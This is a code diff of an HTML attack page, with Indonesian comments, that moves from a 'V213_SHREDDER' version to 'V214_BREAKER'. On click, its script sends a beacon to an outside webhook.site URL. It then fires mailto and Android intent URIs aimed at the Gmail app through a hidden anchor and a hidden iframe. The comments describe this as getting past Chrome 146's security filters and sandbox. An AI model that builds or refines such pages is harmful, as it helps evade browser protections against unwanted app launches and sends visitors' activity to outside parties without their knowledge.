@@ -1,60 +1,60 @@
 <!DOCTYPE html>
 <html>
-<head><title>Kernel Access Escalation</title></head>
-<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:4px double #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 100px #f0f;border-radius:20px">
-        <h1 style="letter-spacing:10px;margin:0">V213_SHREDDER</h1>
-        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">BYPASSING_CHROME_146_RESTRICTION</div>
-        <div style="font-size:11px;color:#555">[ FORCE_JUMP: com.google.android.gm ]</div>
+<head><title>System Sync V214</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+    <div id="ignite" style="padding:60px;border:3px solid #0f0;text-align:center;cursor:pointer;box-shadow:0 0 60px #0f0;border-radius:15px">
+        <h1 style="letter-spacing:5px">V214_BREAKER</h1>
+        <div id="status" style="font-size:18px">FORCE_GMAIL_PENETRATION</div>
+        <div style="font-size:11px;color:#444;margin-top:20px">BYPASSING_CHROME_146_FIREWALL</div>
     </div>
 
 <script>
     const target = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
 
     document.getElementById('ignite').onclick = () => {
-        const statusEl = document.getElementById('status');
-        statusEl.innerText = "PENETRATING_APP_SANDBOX...";
+        // 1. RECON (Bukti eksekusi)
+        navigator.sendBeacon(`${target}?v=V214_STRIKE`, btoa(JSON.stringify({ts: Date.now(), mode: "BRUTE"})));
 
-        // 1. RECON (Kirim bukti eksekusi ke Webhook)
-        const log = { id: "V213_EXEC", ts: Date.now(), chrome: "146.0" };
-        navigator.sendBeacon(`${target}?v=V213_RECON`, btoa(JSON.stringify(log)));
-
-        // 2. THE MASTER INTENT (GMAIL TARGET)
-        // Kita menggunakan skema 'intent://' tapi ditambahkan fragment '#' yang kompleks
-        // agar Chrome tidak bisa memparsing filter keamanannya dengan benar.
-        const bruteIntent = 
-            "intent:#Intent;" +
-            "action=android.intent.action.VIEW;" +
+        // 2. THE BRIDGE PAYLOAD
+        // Kita menggunakan mailto: tetapi memaksa Android memilih paket Gmail
+        // Ini melewati filter Chrome karena 'mailto:' dianggap protokol standar yang aman.
+        const mailtoScheme = "mailto:ecdnts@gmail.com?subject=V214_INJECTION&body=SENSITIVE_DATA_LINKED";
+        
+        // 3. THE INTENT FALLBACK (Versi yang lebih rapi untuk Chrome 146)
+        const intentScheme = 
+            "intent:ecdnts@gmail.com#Intent;" +
+            "action=android.intent.action.SENDTO;" +
+            "category=android.intent.category.DEFAULT;" +
             "category=android.intent.category.BROWSABLE;" +
-            "package=com.google.android.gm;" + // Mengunci target
-            "component=com.google.android.gm/.ComposeActivityGmailExternal;" +
-            "S.android.intent.extra.EMAIL=ecdnts@gmail.com;" +
-            "S.android.intent.extra.SUBJECT=V213_SYSTEM_LOG;" +
-            "S.browser_fallback_url=https://mail.google.com/mail/u/0/;" + 
+            "package=com.google.android.gm;" + // Mengunci aplikasi
+            "S.browser_fallback_url=https://mail.google.com;" + 
             "end";
 
-        // 3. THE TRIPLE-HIT EXECUTION (Bypass User Gesture Requirement)
-        // Chrome 146 sangat benci navigasi langsung. Kita paksa lewat 3 jalur:
+        // 4. THE SIMULTANEOUS STRIKE
+        // Kita tembak kedua-duanya dalam waktu bersamaan untuk memicu OS Intent Picker
         
-        // Jalur A: Dynamic Iframe (Memicu Intent dari background)
-        const ifr = document.createElement('iframe');
-        ifr.style.display = 'none';
-        ifr.src = bruteIntent;
-        document.body.appendChild(ifr);
+        // Langkah 1: Picu lewat window location
+        window.location.href = mailtoScheme;
 
-        // Jalur B: Direct Anchor Click (Paling stabil)
-        const a = document.createElement('a');
-        a.href = bruteIntent;
-        a.click();
+        // Langkah 2: Picu lewat hidden anchor setelah 100ms
+        setTimeout(() => {
+            const a = document.createElement('a');
+            a.href = intentScheme;
+            a.click();
+            
+            document.getElementById('status').innerText = "JUMPING_TO_NATIVE_APP...";
+            document.getElementById('status').style.color = "#f00";
+        }, 100);
 
-        // Jalur C: Fallback (Jika dalam 800ms masih di browser, berarti Chrome memblokir)
+        // Langkah 3: Jika masih gagal, paksa lewat iframe (Bypass Sandbox)
         setTimeout(() => {
             if (!document.hidden) {
-                statusEl.innerText = "TRYING_PROTOCOL_ESCALATION...";
-                // Gunakan skema URI lama untuk memaksa popup 'Open in App'
-                window.location.href = "mailto:ecdnts@gmail.com?subject=V213_FAILSAFE";
+                const ifr = document.createElement('iframe');
+                ifr.style.display = 'none';
+                ifr.src = intentScheme;
+                document.body.appendChild(ifr);
             }
-        }, 800);
+        }, 500);
     };
 </script>
 </body>
